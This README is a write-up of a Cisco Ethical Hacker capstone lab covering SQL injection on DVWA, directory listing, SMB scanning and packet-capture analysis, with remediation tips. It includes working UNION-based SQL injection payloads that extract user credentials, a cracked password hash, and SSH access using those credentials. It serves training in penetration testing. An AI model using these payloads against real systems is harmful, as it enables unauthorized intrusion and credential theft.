# Final-Capstone-Project
#  Cisco Ethical Hacker Capstone – Commands & Remediation Guide

This repository documents the **Final Capstone Activity** from the Cisco Ethical Hacker course.  
It covers four penetration testing challenges, the exact commands used, and remediation steps.

---

##  Lab Environment

| Challenge | Hostname       | IP Address       |
|-----------|----------------|------------------|
| DVWA SQLi | `dvwa.local`   | `10.5.5.12` |
| Web Vuln  | `dvma.local`| `10.5.5.12` |
| SMB Vuln  | `gravemind.local`| `10.5.5.14` |
| PCAP Lab  | `pcap.local`   | `10.5.5.12` |

---

##  ✅Challenge 1 – SQL Injection (DVWA)

### Objective
Exploit a SQL Injection vulnerability to identify the database name, extract user credentials, and gain server access.

###  Exploitation Steps
1. Database Enumeration Identify the database name using the DATABASE() function.

### SQL

`1' OR 1=1 UNION SELECT 1, DATABASE()#`
- Result: Database name identified as dvwa.

2. Column Enumeration Identify column names from the information_schema.

SQL

`1' OR 1=1 UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'#`
- Result: Found sensitive columns: user_id, first_name, last_name, user, password.

3. Data Extraction Extract usernames and password hashes.

### SQL

`1' OR 1=1 UNION SELECT user,password FROM users #`
- Result: Found user smithy with hash 5f4dcc3b5aa765d61d8327deb882cf99 (Cracked: password).

4. Server Access & Flag Retrieval

```Bash

# SSH into the target using the cracked credentials
ssh smithy@192.168.8.18

# Locate the flag file
ls
cat my_passwords.txt
Flag Found: 8748wf83.
```

## ✅ Challenge 2 – Directory Listing
### Objective
- Enumerate a web server to find sensitive directories and files exposed via misconfiguration.

###  Exploitation Steps
1. Nikto Vulnerability Scan

Bash

`nikto -h 10.5.5.12`
- Result: Nikto identified + /config/: Directory indexing found. and + /config/: Configuration information may be available remotely.

2. Flag Retrieval Browsing to the identified directory reveals sensitive configuration files.

###  Remediation
- Disable Directory Indexing: Set Options -Indexes in the Apache configuration to prevent users from browsing folder contents.

- Restrict Access: Move configuration files outside the web root or restrict access via .htaccess.



## ✅ Challenge 3 – SMB Enumeration
### Objective
- Identify open SMB ports and enumerate shares on the network.

###  Exploitation Steps
1. Network Scanning with Nmap

Bash

`nmap -p 139,445 10.5.5.0/24`
- Result: Target gravemind.pc (10.5.5.14) has ports 139/tcp netbios-ssn and 445/tcp microsoft-ds open.

### Remediation
* Disable guest access.

* Restrict shares to specific groups.

* Patch SMB services.

* Segment networks to limit exposure.

## ✅Challenge 4 – Packet Capture Analysis
### Objective
- Analyze a network capture to intercept sensitive data transmitted in cleartext.

###  Analysis Steps
1. Wireshark Inspection

- Open SA.pcap in Wireshark.

- Filter for http traffic.

- Observe a GET /data/user_accounts.xml request from 10.5.5.11.

2. Flag Retrieval Accessing the .xml file reveals the credential database.

Path: http://10.5.5.11/data/user_accounts.xml

Flag Found: z1z-1478K
### Remediation
* Enforce HTTPS/TLS.

* Restrict sensitive directories.

* Harden server configs.

* Monitor for cleartext leaks.
